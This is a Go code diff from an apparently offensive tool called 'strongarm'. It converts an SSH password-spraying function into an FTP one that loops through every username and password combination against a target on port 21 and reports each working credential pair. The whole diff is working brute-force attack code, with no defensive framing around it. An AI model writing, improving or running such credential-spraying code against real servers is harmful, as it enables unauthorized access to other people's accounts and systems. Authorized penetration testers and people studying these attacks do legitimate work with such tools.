@@ -4,31 +4,35 @@ import (
 	"fmt"
 	"sync"
 
-	"github.com/whiterabb17/strongarm/gossh"
+	"github.com/whiterabb17/strongarm/packages/goftp"
 )
 
-func sshSpray(wg *sync.WaitGroup, channelToCommunicate chan string, taskToRun task, storeResult *int) {
+func ftpSpray(wg *sync.WaitGroup, channelToCommunicate chan string, taskToRun task, storeResult *int) {
 	defer wg.Done()
 	internalCounter := 0
 	if taskToRun.target.port == 0 {
-		taskToRun.target.port = 22
+		taskToRun.target.port = 21
 	}
 	for _, password := range taskToRun.passwords {
 		for _, username := range taskToRun.usernames {
 			if internalCounter >= *storeResult {
-				sshClient, err := gossh.DialWithPasswd(stringifyTarget(taskToRun.target), username, password)
+				ftpClient, err := goftp.NewFtp(stringifyTarget(taskToRun.target))
 				if err != nil {
+					panic(err)
+				}
+
+				if err = ftpClient.Login(username, password); err != nil {
 					fmt.Print("-")
 				} else {
 					fmt.Print("+")
 					channelToCommunicate <- username + ":" + password
-					sshClient.Close()
 				}
+				ftpClient.Close()
 				*storeResult++
 			} else {
+
 			}
 			internalCounter++
 		}
 	}
-
 }
